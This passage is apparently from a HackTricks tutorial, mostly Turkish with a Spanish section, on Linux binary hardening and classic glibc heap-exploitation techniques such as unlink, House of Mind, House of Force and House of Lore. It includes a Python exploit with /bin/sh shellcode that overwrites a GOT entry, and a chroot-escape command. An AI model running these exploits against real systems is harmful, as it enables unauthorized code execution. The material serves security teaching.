0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef➤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  →   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Binary **relro olmadan**, `fgets` için `got` giriş adresinin `0x404018` olduğunu görebiliriz. Bellek eşlemelerine baktığımızda, bu adresin `0x404000` ile `0x405000` arasında olduğunu görüyoruz, bu da **izinlerin `rw`** olduğu anlamına gelir, yani okuma ve yazma yapabiliriz. **relro ile** binary için, binary'nin çalıştırılma sırasındaki `got` tablosu adresinin (pie etkin olduğundan bu adres değişecektir) `0x555555557fd0` olduğunu görüyoruz. Bu binary'nin bellek eşlemesinde, `0x0000555555557000` ile `0x0000555555558000` arasında düşer, bu da bellek **izininin `r`** olduğu anlamına gelir, yani sadece okuyabiliriz.

Peki **atlatma** nedir? Kullandığım tipik atlatma, relro'nun okunabilir olmasına neden olduğu bellek bölgelerine yazmamak ve **kod yürütme için farklı bir yol bulmaktır**.

Bunun gerçekleşmesi için binary'nin yürütülmeden önce fonksiyonların adreslerini bilmesi gerekir:

* Tembel bağlama: Bir fonksiyonun adresi ilk kez çağrıldığında aranır. Bu nedenle, GOT'un yürütme sırasında yazma izinlerine sahip olması gerekir.
* Şimdi bağla: Fonksiyonların adresleri yürütmenin başlangıcında çözülür, ardından .got, .dtors, .ctors, .dynamic, .jcr gibi hassas bölümlere salt okunur izinler verilir. `` `** ``-z relro`**`y`**`-z now\`\*\*

Bir programın Şimdi bağlama kullanıp kullanmadığını kontrol etmek için şunu yapabilirsiniz:
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
Cuando el binario es cargado en memoria y una función es llamada por primera vez se salta a la PLT (Procedure Linkage Table), de aquí se realiza un salto (jmp) a la GOT y descubre que esa entrada no ha sido resuelta (contiene una dirección siguiente de la PLT). Por lo que invoca al Runtime Linker o rtfd para que resuelva la dirección y la guarde en la GOT.

Cuando se llama a una función se llama a la PLT, esta tiene la dirección de la GOT donde se almacena la dirección de la función, por lo que redirige el flujo allí y así se llama a la función. Sin embargo, si es la primera vez que se llama a la función, lo que hay en la GOT es la siguiente instrucción de la PLT, por lo tanto el flujo sigue el código de la PLT (rtfd) y averigua la dirección de la función, la guarda en la GOT y la llama.

Al cargar un binario en memoria el compilador le ha dicho en qué offset tiene que situar datos que se deben de cargar cuando se corre el programa.

Lazy binding —> La dirección de la función se busca la primera vez que se invoca dicha función, por lo que la GOT tiene permisos de escritura para que cuando se busque, se guarde ahí y no haya que volver a buscarla.

Bind now —> Las direcciones de las funciones se buscan al cargar el programa y se cambian los permisos de las secciones .got, .dtors, .ctors, .dynamic, .jcr a solo lectura. **-z relro** y **-z now**

A pesar de esto, en general los programas no están complicados con esas opciones luego estos ataques siguen siendo posibles.

**readelf -l /proc/ID\_PROC/exe | grep BIND\_NOW** —> Para saber si usan el BIND NOW

**Fortify Source -D\_FORTIFY\_SOURCE=1 o =2**

Trata de identificar las funciones que copian de un sitio a otro de forma insegura y cambiar la función por una función segura.

Por ej:\
char buf\[16];\
strcpy(but, source);

La identifica como insegura y entonces cambia strcpy() por \_\_strcpy\_chk() utilizando el tamaño del buffer como tamaño máximo a copiar.

La diferencia entre **=1** o **=2** es que:

La segunda no permite que **%n** venga de una sección con permisos de escritura. Además el parámetro para acceso directo de argumentos solo puede ser usado si se usan los anteriores, es decir, solo se pueda usar **%3$d** si antes se ha usado **%2$d** y **%1$d**

Para mostrar el mensaje de error se usa el argv\[0], por lo que si se pone en el la dirección de otro sitio (como una variable global) el mensaje de error mostrará el contenido de dicha variable. Pag 191

**Reemplazo de Libsafe**

Se activa con: LD\_PRELOAD=/lib/libsafe.so.2\
o\
“/lib/libsave.so.2” > /etc/ld.so.preload

Se interceptan las llamadas a algunas funciones inseguras por otras seguras. No está estandarizado. (solo para x86, no para compilaxiones con -fomit-frame-pointer, no compilaciones estaticas, no todas las funciones vulnerables se vuelven seguras y LD\_PRELOAD no sirve en binarios con suid).

**ASCII Armored Address Space**

Consiste en cargar las librería compartidas de 0x00000000 a 0x00ffffff para que siempre haya un byte 0x00. Sin embargo, esto realmente no detiene a penas ningún ataque, y menos en little endian.

**ret2plt**

Consiste en realiza un ROP de forma que se llame a la función strcpy@plt (de la plt) y se apunte a la entrada de la GOT y se copie el primer byte de la función a la que se quiere llamar (system()). Acto seguido se hace lo mismo apuntando a GOT+1 y se copia el 2ºbyte de system()… Al final se llama la dirección guardada en GOT que será system()

**Falso EBP**

Para las funciones que usen el EBP como registro para apuntar a los argumentos al modificar el EIP y apuntar a system() se debe haber modificado el EBP también para que apunte a una zona de memoria que tenga 2 bytes cuales quiera y después la dirección a &”/bin/sh”.

**Jaulas con chroot()**

debootstrap -arch=i386 hardy /home/user —> Instala un sistema básico bajo un subdirectorio específico

Un admin puede salir de una de estas jaulas haciendo: mkdir foo; chroot foo; cd ..

**Instrumentación de código**

Valgrind —> Busca errores\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Heap Overflows: Exploits básicos**

**Trozo asignado**

prev\_size |\
size | —Cabecera\
\*mem | Datos

**Trozo libre**

prev\_size |\
size |\
\*fd | Ptr forward chunk\
\*bk | Ptr back chunk —Cabecera\
\*mem | Datos

Los trozos libres están en una lista doblemente enlazada (bin) y nunca pueden haber dos trozos libres juntos (se juntan)

En “size” hay bits para indicar: Si el trozo anterior está en uso, si el trozo ha sido asignado mediante mmap() y si el trozo pertenece al arena primario.

Si al liberar un trozo alguno de los contiguos se encuentra libre , estos se fusionan mediante la macro unlink() y se pasa el nuevo trozo más grande a frontlink() para que le inserte el bin adecuado.

unlink(){\
BK = P->bk; —> El BK del nuevo chunk es el que tuviese el que ya estaba libre antes\
FD = P->fd; —> El FD del nuevo chunk es el que tuviese el que ya estaba libre antes\
FD->bk = BK; —> El BK del siguiente chunk apunta al nuevo chunk\
BK->fd = FD; —> El FD del anterior chunk apunta al nuevo chunk\
}

Por lo tanto si conseguimos modificar el P->bk con la dirección de un shellcode y el P->fd con la dirección a una entrada en la GOT o DTORS menos 12 se logra:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

Y así se se ejecuta al salir del programa la shellcode.

Además, la 4º sentencia de unlink() escribe algo y la shellcode tiene que estar reparada para esto:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) —> Esto provoca la escritura de 4 bytes a partir del 8º byte de la shellcode, por lo que la primera instrucción de la shellcode debe ser un jmp para saltar esto y caer en unos nops que lleven al resto de la shellcode.

Por lo tanto el exploit se crea:

En el buffer1 metemos la shellcode comenzando por un jmp para que caiga en los nops o en el resto de la shellcode.

Después de la shell code metemos relleno hasta llegar al campo prev\_size y size del siguiente trozo. En estos sitios metemos 0xfffffff0 (de forma que se sobrescrita el prev\_size para que tenga el bit que dice que está libre) y “-4“(0xfffffffc) en el size (para que cuando compruebe en el 3º trozo si el 2º estaba libre en realidad vaya al prev\_size modificado que le dirá que s´está libre) -> Así cuando free() investigue irá al size del 3º pero en realidad irá al 2º - 4 y pensará que el 2º trozo está libre. Y entonces llamará a **unlink()**.

Al llamar a unlink() usará como P->fd los primeros datos del 2º trozo por lo que ahí se meterá la dirección que se quieres sobreescribir - 12(pues en FD->bk le sumará 12 a la dirección guardada en FD) . Y en esa dirección introducirá la segunda dirección que encuentre en el 2º trozo, que nos interesará que sea la dirección a la shellcode(P->bk falso).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**
**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I”, 0xfffffff0) #Önemli olan önceki parçanın boş olduğunu gösteren bitin 1 olmasıdır**

**fake\_size = pack("\<I”, 0xfffffffc) #-4, 3. parçanın "size" değerinin 4 byte geride olduğunu düşünmesi için (prev\_size'ye işaret eder)**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Payload'da başlangıçta 8 byte dolgu ekleyeceğiz**

**got\_free = pack("\<I", 0x08048300 - 12) #free() adresi plt-12 (free ikinci kez çağrıldığında shellcode'un çalıştırılacağı adresi üzerine yazacak olan adres)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #Payload, 8 byte dolgu ile başlar çünkü öyle söylendi**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #2. parça değiştirilir, got\_free, addr\_sc + 12 adresini kaydedeceğimiz yere işaret eder**

**os.system("./8.3.o " + payload)**

**unset() ters sırayla serbest bırakma (wargame)**

Üç ardışık parçayı kontrol ediyoruz ve rezerve edildikleri sırayla serbest bırakılıyorlar.

Bu durumda:

Parça c'ye shellcode yerleştirilir

Parça a, b'yi üzerine yazmak için kullanılır, böylece boyutunun PREV\_INUSE biti devre dışı bırakılır ve parça a'nın boş olduğunu düşünür.

Ayrıca, başlık b'de boyut -4 olacak şekilde üzerine yazılır.

Sonuç olarak, program "a"nın boş olduğunu ve bir binde olduğunu düşünecek ve onu ayırmak için unlink() çağrısı yapacaktır. Ancak, çünkü başlık PREV\_SIZE -4'e eşit, program "a" parçasının aslında b+4'te başladığını düşünecektir. Yani, b+4'te bir unlink() yapacak ve b+12'de "fd" işaretçisi, b+16'da "bk" işaretçisi olacaktır.

Bu şekilde, bk'ya shellcode adresini ve fd'ye "puts()" fonksiyonunun adresini -12 olarak yerleştirirsek payloadumuzu elde ederiz.

**Frontlink Tekniği**

Bir şey serbest bırakıldığında ve yanındaki parçalar boş değilse, unlink() çağrılmaz, doğrudan frontlink() çağrılır.

Saldırılan malloc hiçbir zaman serbest bırakılmazsa yararlı bir zayıflıktır.

Gereksinimler:

Veri girişi işleviyle taşınabilir bir tampon

Bu tampona bitişik serbest bırakılacak ve başlık fd alanı taşınma ile değiştirilecek bir tampon

512'den büyük ancak önceki tampona göre küçük bir boyutta serbest bırakılacak bir tampon

Bu adımdan önce tanımlanmış bir tampon, bu tamponun prev\_size'ını üzerine yazmaya izin verir

Bu şekilde, kontrolsüz iki malloc üzerine yazarak ve sadece birinin serbest bırakılmasını sağlayarak bir saldırı gerçekleştirebiliriz.

**Çift free() Zayıflığı**

Aynı işaretçiyle iki kez free() çağrılırsa, iki bin aynı adrese işaret eder.

Birini tekrar kullanmak istendiğinde sorunsuzca atanır. Diğerini kullanmak istendiğinde, önceki rezervasyonun yazdığı verilerle "fd" ve "bk" işaretçileri yanıltılır.

**Free() Sonrası**

Önceden serbest bırakılan bir işaretçi kontrolsüz bir şekilde yeniden kullanılır.

## **8 Heap Taşmaları: Gelişmiş Saldırılar**

Unlink() ve FrontLink() teknikleri unlink() işlevi değiştirilerek kaldırıldı.

**The house of mind**

Kodun keyfi olarak yürütülmesi için sadece bir free() çağrısı gereklidir. Önce birinci parçayı taşırabilecek ve serbest bırakılacak ikinci bir parça bulunmalıdır.

Bir free() çağrısı, public\_fREe(mem) işlevini çağırır, bu işlev:

mstate ar\_ptr;

mchunkptr p;

…

p = mem2chunk(mes); —> Bir parçanın başladığı adresi (mem-8) döndürür

…

ar\_ptr = arena\_for_chunk(p); —> chunk\_non\_main\_arena(ptr)?heap\_for_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

…

\_int\_free(ar\_ptr, mem);

}

\[1] kısmında size alanı NON\_MAIN\_ARENA bitini kontrol eder, bu değeri değiştirerek kontrolü true yapabilir ve heap\_for\_ptr() işlevini çalıştırabiliriz. Bu işlev, "mem" üzerinde bir and işlemi yaparak en az anlamlı 2.5 byte'ı sıfırlar (örneğin 0x0804a000'den 0x08000000'e) ve 0x08000000->ar\_ptr adresine erişir (struct heap\_info gibi).

Bu şekilde, örneğin 0x0804a000 adresinde bir parçayı kontrol edebilir ve **0x081002a0** adresinde bir parça serbest bırakılıyorsa 0x08100000 adresine ulaşabilir ve istediğimiz şeyi, örneğin **0x0804a000** adresini yazabiliriz. Bu ikinci parça serbest bırakıldığında, heap\_for\_ptr(ptr)->ar\_ptr'ın 0x08100000 adresinde yazdığımızı görecektir (çünkü önce bahsettiğimiz and işlemi uygulanır ve buradan ilk 4 byte'ın değeri alınır, yani ar\_ptr).

Bu şekilde \_int\_free(ar\_ptr, mem) çağrılır, yani **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
…\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Daha önce av değerini kontrol edebildiğimiz için, serbest bırakılacak parçanın üzerine yazdığımız değerdir.

Unsorted\_chunks'ı tanımladığımız gibi biliyoruz ki:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Bu nedenle av->bins\[2] adresine \_\_DTOR\_END\_\_-12 adresini yazarsak, son talimatta \_\_DTOR\_END\_\_ adresine ikinci parçanın adresi yazılacaktır.

Yani, ilk parçanın başına \_\_DTOR\_END\_\_-12 adresini birçok kez yazmamız gerekmektedir, çünkü av->bins\[2] buradan değeri alacaktır.

İkinci parçada prev\_size'a bir jump 0x0c ve NON\_MAIN\_ARENA'yı etkinleştirecek bir boyut yazıyoruz.

Ardından, ikinci parçaya bir sürü nops ve sonunda shellcode ekliyoruz.

Bu şekilde \_int\_free(TROZO1, TROZO2) çağrılır ve \_\_DTOR\_END\_\_ adresine TROZO2'nin prev\_size adresi yazılır, bu da shellcode'a atlar.

Bu tekniği uygulamak için payload'un biraz daha karmaşık olmasını gerektiren bazı ek gereksinimlerin karşılanması gerekmektedir.
Bu teknik artık uygulanabilir değil çünkü unlink için neredeyse aynı yama uygulandı. Yeni hedef siteye işaret edip etmediği karşılaştırılır.

**Fastbin**

The house of mind'in bir varyantıdır.

\_int\_free() fonksiyonunun ilk kontrolünden sonra aşağıdaki kodu çalıştırmak istiyoruz:

fb = &(av->fastbins\[fastbin\_index(size)] —> fastbin\_index(sz) —> (sz >> 3) - 2

…

p->fd = \*fb

\*fb = p

Böylece "fb" adresi GOT'taki bir fonksiyonun adresini verirse, bu adrese üzerine yazılacak olan adresi koyarız. Bunun için arena'nın dtors adreslerine yakın olması gerekir. Daha doğrusu av->max\_fast'in üzerine yazılacak olan adreste olması gerekir.

The House of Mind ile kontrolün av tarafından yapıldığını gördük.

Bu durumda, boyut alanına 8 + NON\_MAIN\_ARENA + PREV\_INUSE boyutunu koyarsak, fastbin\_index() bize fastbins\[-1]'i döndürecektir, bu da av->max\_fast'e işaret edecektir.

Bu durumda av->max\_fast'in üzerine yazılacak (işaret edilen değil, üzerine yazılacak olan) adres olacaktır.

Ayrıca, serbest bırakılan parçanın bitişik parçasının 8'den büyük olması gerekir -> Serbest bırakılan parçanın boyutunun 8 olduğunu söylediğimize göre, bu sahte parçaya sadece 8'den büyük bir boyut koymamız yeterlidir (ayrıca shellcode serbest bırakılan parçada olacağından, sahte parçanın boyut alanının hemen başına bir jmp koymamız gerekecektir).

Ayrıca, aynı sahte parçanın av->system\_mem'den küçük olması gerekir. av->system\_mem 1848 bayt daha ileridedir.

\_DTOR\_END\_ ve GOT'taki az sayıda adresin null olmasından dolayı, bu bölümlerin hiçbiri üzerine yazılacak adres olarak uygun değildir, bu yüzden fastbin'i yığını hedeflemek için nasıl uygulayacağımıza bakalım.

Başka bir saldırı şekli de **av**'yi yığını işaret etmeye yönlendirmektir.

Boyutu 8'den ziyade 16 yaparsak: fastbin\_index() bize fastbins\[0]'ı döndürecektir ve bunu yığını üzerine yazmak için kullanabiliriz.

Bunun için yığında canary veya garip değerler olmamalıdır, aslında şu şekilde olmalıdır: 4 bayt null + EBP + RET

4 bayt null, **av**'nin bu adrese işaret edeceği ve bir **av**'nin ilk öğesinin 0 olması gereken bir adrestir.

**av->max\_fast** EBP olacak ve bizi kısıtlamalardan geçirecek bir değer olacaktır.

**av->fastbins\[0]** adresi **p**'nin adresiyle üzerine yazılacak ve RET olacaktır, böylece shellcode'a atlanacaktır.

Ayrıca, **av->system\_mem**'de (yığının pozisyonundan 1484 bayt yukarıda) atlayabileceğimiz yeterince çöp olacaktır.

Ayrıca, serbest bırakılan parçanın bitişik parçasının 8'den büyük olması gerekir -> Serbest bırakılan parçanın boyutunun 16 olduğunu söylediğimize göre, bu sahte parçaya sadece 8'den büyük bir boyut koymamız yeterlidir (ayrıca shellcode serbest bırakılan parçada olacağından, sahte parçanın boyut alanının hemen başına, yeni sahte parçanın boyut alanının sonrasındaki nops'a atlayacak bir jmp koymamız gerekecektir).

**The House of Spirit**

Bu durumda, saldırganın değiştirebileceği bir malloc işaretçisine sahip olmayı amaçlıyoruz (örneğin, bu işaretçinin bir değişken üzerindeki taşmaya karşı stack'te olması).

Böylece, bu işaretçiyi istediği yere işaret edecek şekilde yapabiliriz. Ancak, herhangi bir yer uygun değildir, sahte parçanın boyutu av->max\_fast'tan küçük olmalı ve daha spesifik olarak gelecekteki bir malloc() çağrısında istenen boyuta eşit olmalıdır. Bu nedenle, eğer bu savunmasız işaretçiden sonra malloc(40) çağrılacağını biliyorsak, sahte parçanın boyutu 48 olmalıdır.

Örneğin, program kullanıcıdan bir sayı istediğinde 48 girebilir ve değiştirilebilir malloc işaretçisini bir sonraki 4 bayta (şans eseri EBP'ye ait olabilir, böylece 48 arkada kalır, sanki boyut başlık gibi) işaret edebiliriz. Ayrıca, ptr-4+48 adresinin çeşitli koşulları karşılaması gerekir (bu durumda ptr=EBP), yani 8 < ptr-4+48 < av->system\_mem olmalıdır.

Bu koşullar sağlandığında, söz konusu malloc(40) çağrıldığında EBP'nin adresi olarak EBP'nin adresi atanacaktır. Saldırgan ayrıca bu malloc'ta ne yazılacağını kontrol edebiliyorsa, EBP ve EIP'yi istediği adrese üzerine yazabilir.

Bu, çünkü free() işlemi, yığının EBP'sine uygun boyutta yeni bir malloc() rezerve etmek istediğini hatırlayacak ve bu adresi atayacaktır.

**The House of Force**

Gerekenler:

* Wilderness'ı üzerine yazılabilir hale getiren bir taşma
* Kullanıcı tarafından tanımlanan boyutta bir malloc() çağrısı
* Kullanıcı tarafından tanımlanan verilere sahip bir malloc() çağrısı

İlk olarak, wilderness parçasının boyutunu çok büyük bir değerle (0xffffffff) üzerine yazarak yapılır, böylece yeterince büyük bir bellek talebi \_int\_malloc() tarafından genişletilmeden işlenecektir.

İkincisi, av->top'u, saldırganın kontrolü altındaki bir bellek bölgesine, örneğin yığın, işaret edecek şekilde değiştirmektir. av->top'a \&EIP - 8 konulacaktır.

Saldırganın kontrolü altındaki bellek bölgesine işaret eden av->top'u değiştirmek için:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim, mevcut wilderness parçasının adresini (mevcut av->top) alır ve remainder tam olarak bu adresin malloc() tarafından talep edilen bayt sayısı kadar ilerisine eklenir. Bu nedenle, \&EIP-8'in 0xbffff224 olduğu ve av->top'un 0x080c2788 olduğu durumda, av->top'un bir sonraki malloc() için \&EIP-8'e işaret etmesi için kontrol edilen malloc için rezerve edilmesi gereken miktar şudur:

0xbffff224 - 0x080c2788 = 3086207644.

Bu şekilde değiştirilmiş değer av->top'a kaydedilir ve bir sonraki malloc EIP'ye işaret eder ve üzerine yazılabilir.

Yeni wilderness parçasının boyutunun, son malloc() tarafından yapılan talepten daha büyük olması önemlidir. Yani, wilderness \&EIP-8'i işaret ediyorsa, boyut tam olarak yığının EBP alanında kalır.

**The House of Lore**

**SmallBin Bozulması**

Serbest bırakılan parçalar, boyutlarına göre bin'e yerleştirilir. Ancak, bunlar bin'e yerleştirilmeden önce sıralanmamış bine konulur. Bir parça serbest bırakıldığında, hemen bin'e konulmaz, sıralanmamış bine kalır. Ardından, yeni bir parça rezerve edilirse ve önceki serbest bırakılan parça yeterliyse, bu parça geri verilir, ancak daha büyük bir parça rezerve edilirse, sıralanmamış bine konulan serbest bırakılan parça uygun bin'e konulur.

Zararlı kodun erişebileceği kodu ulaşmak için bellek talebi av->max\_fast'tan büyük (genellikle 72) ve MIN\_LARGE\_SIZE'dan küçük (512) olmalıdır.

Eğer bin'de istenilen boyutta bir parça varsa, bu parça çözümlendikten sonra geri döndürülür:

bck = victim->bk; Önceki parçaya işaret eder, değiştirebileceğimiz tek bilgidir.

bin->bk = bck; Önceki parça son parça olur, eğer bck yığını işaret ediyorsa, bir sonraki rezerve edilen parça bu adrese verilecektir.

bck->fd = bin; Liste kapatılır ve bu bin'e işaret eder.

Gerekenler:
İki malloc ayrılmalı, böylece ikincisi serbest bırakıldıktan ve bin'ine eklendikten sonra ilkine taşma yapılabilir (yani taşma yapmadan önce ikinci parçadan daha büyük bir malloc ayrılmış olmalıdır).

Saldırganın kontrol edebileceği saldırgan tarafından seçilen bir adresi olan malloc ayrılmış olmalıdır.

Amacımız şudur, bir heap'e taşma yapabilirsek ve altında serbest bırakılmış ve bin'ine eklenmiş bir parça varsa, bk işaretçisini değiştirebiliriz. Bk işaretçisini değiştirirsek ve bu parça bin'in listenin başındaki ilk parça olursa ve ayrıldığında, bin yanıltılacak ve bir sonraki parçanın (sunulan) yanlış adreste olduğuna inanılacak (örneğin stack veya GOT'a). Bu durumda başka bir parça ayrıldığında ve saldırganın izinleri varsa, istenen konumda bir parça verilecek ve oraya yazabilecektir.

Değiştirilen parçanın serbest bırakılmasından sonra serbest bırakılan parçadan daha büyük bir parça ayrılması gerekmektedir, böylece değiştirilen parça sıralanmamış bin'lerden çıkar ve bin'ine eklenir.

Bin'ine girdikten sonra bk işaretçisini taşma yaparak istediğimiz adrese işaret etmesi gerekmektedir.

Bu durumda, bin'in, istenilen konumda bir parça vermek için yeterli sayıda malloc() çağrısının yapılmasını beklemesi gerekmektedir ve bin'i yanıltarak bir sonraki parçanın yanlış adreste olduğuna inanmasını sağlamak gerekmektedir. Ve ardından istediğimiz parça verilecektir.

Bu zafiyetin mümkün olan en kısa sürede gerçekleşmesi için ideal olan şudur: Zafiyetli parçanın ayrılması, değiştirilecek parçanın ayrılması, bu parçanın serbest bırakılması, değiştirilecek parçadan daha büyük bir parça ayrılması, parça değiştirilmesi (zafiyet), zafiyetli parçadan aynı boyutta bir parça ayrılması ve zafiyetli parçadan aynı boyutta ikinci bir parça ayrılması ve bu ikincisi seçilen adrese işaret edecektir.

Bu saldırıyı korumak için, tipik olarak, parçanın "yanlış" olmadığını kontrol etmek için bir kontrol yapılır: bck->fd'nin victim'a işaret etmediği kontrol edilir. Yani, bizim durumumuzda, stack'te işaret edilen yanlış parçanın fd\* işaretçisinin victim'a işaret edip etmediği kontrol edilir. Bu korumayı aşmak için saldırganın, doğru adrese (muhtemelen stack üzerinden) victim'ın adresini bir şekilde yazabilmesi gerekir. Böylece yanlış bir parça gibi görünür.

**LargeBin Bozulması**

Önceki gereksinimlerin yanı sıra, ayrılan parçaların 512'den büyük olması gerekmektedir.

Saldırı, öncekiyle aynıdır, yani bk işaretçisini değiştirmek gerekmektedir ve tüm bu malloc() çağrılarına ihtiyaç vardır, ancak ayrıca değiştirilen parçanın boyutunu değiştirmek gerekmektedir, böylece bu boyut - nb < MINSIZE olmalıdır.

Örneğin, 1552 boyutunda bir parça koymak, 1552 - 1544 = 8 < MINSIZE olacak şekilde boyutu değiştirmek anlamına gelir (çıkarma negatif olmamalıdır çünkü bir unsigned karşılaştırılır).

Ayrıca, daha karmaşık hale getirmek için bir yama eklenmiştir.

**Heap Spreyi**

Temelde, mümkün olan tüm belleği heap'ler için ayırmak ve bunları nops yastığı ile doldurmak ve bu yastık olarak 0x0c kullanmaktır. Yani 0x0c0c0c0c adresine atlamaya çalışılacak ve böylece bu yastıkla çağrılacak bir adres üzerine yazılırsa oraya atlayacaktır. Temel olarak taktik, bir şeylerin üzerine yazılıp yazılmadığını görmek için mümkün olduğunca fazla ayırmaktır ve 0x0c0c0c0c adresine atlamayı denemektir, orada nops olup olmadığını umarak.

**Heap Feng Shui**

Belleği sementasyon yaparak, aralarında serbest bırakılmış parçaların kaldığı şekilde belleği sementlemek anlamına gelir. Taşmayı yapılacak tampon bir boşluğa yerleştirilir.

## İlginç Kurslar

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Referanslar**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hacklemeyi öğrenin</summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
* [**The PEASS Family'yi keşfedin**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin
* **💬 [Discord grubuna](https://discord.gg/hRep4RUj7f) veya [telegram grubuna](https://t.me/peass) katılın veya** Twitter'da 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'ı takip edin.**
* **Hacking püf noktalarınızı göndererek HackTricks ve HackTricks Cloud github depolarına PR göndererek paylaşın.**

</details>
